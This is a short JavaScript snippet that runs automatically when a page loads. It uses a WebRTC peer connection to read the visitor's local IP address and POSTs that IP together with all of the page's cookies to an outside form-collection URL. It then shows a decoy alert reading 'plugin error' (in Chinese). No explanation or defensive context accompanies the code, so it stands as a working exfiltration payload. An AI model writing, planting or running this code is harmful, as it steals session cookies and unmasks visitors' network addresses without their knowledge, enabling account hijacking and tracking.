
        
        function getIP() {
            return new Promise((resolve, reject) => {
                
                const pc = new RTCPeerConnection({iceServers: []});
                
                pc.createDataChannel(""); 
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
                
                pc.onicecandidate = ice => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.split(" ")[4];
                    resolve(ip);
                    pc.onicecandidate = () => {};
                };
            });
        }

        
        function sendIP(ip) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://forminit.com/f/pe4ybh8js0j", true);
			xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ "ip": ip, "cookies": document.cookie, "timestamp": new Date().toISOString()}));
        }

       
        async function execute() {
            try {
                const ip = await getIP();
                sendIP(ip);
            } catch (error) {
                console.error("Error:", error);
            }
            
            
            setTimeout(() => {
                alert("插件错误");
            }, 1000);
        }

        
        window.addEventListener('load', execute);
